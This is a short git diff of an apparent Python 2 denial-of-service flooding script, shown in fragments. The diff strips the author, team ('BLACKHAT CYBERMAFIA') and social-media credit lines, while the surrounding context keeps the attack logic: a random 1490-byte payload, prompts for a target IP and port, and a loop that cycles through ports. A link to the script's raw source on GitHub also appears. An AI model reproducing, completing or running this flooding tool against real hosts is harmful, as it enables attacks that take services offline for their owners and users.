@@ -19,11 +19,7 @@ bytes = random._urandom(1490)
 
 os.system("clear")
 os.system("figlet DDOS MCHACKC++")
-print
-print "AUTHOR GZ   : IR.MCHACKC++.St "
-print "YOUTUBE: https://youtube.com/channel/UCracsrr1QaV4rjZxOQsUnYg "
-print "TEAM: BLACKHAT CYBERMAFIA"
-print "INSTAGRAM: https://www.instagram.com/blackhatcybermafiaofc/"
+
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
@@ -49,3 +45,4 @@ while True:
      if port == 65534:
        port = 1
  https://raw.githubusercontent.com/BLACKHAT CYBERMAFIA/DDOS-Attack/master/ddos-attack.py#:~:text=import%20sys%0Aimport,65534%3A%0A%20%20%20%20%20%20%20port%20%3D%201
+
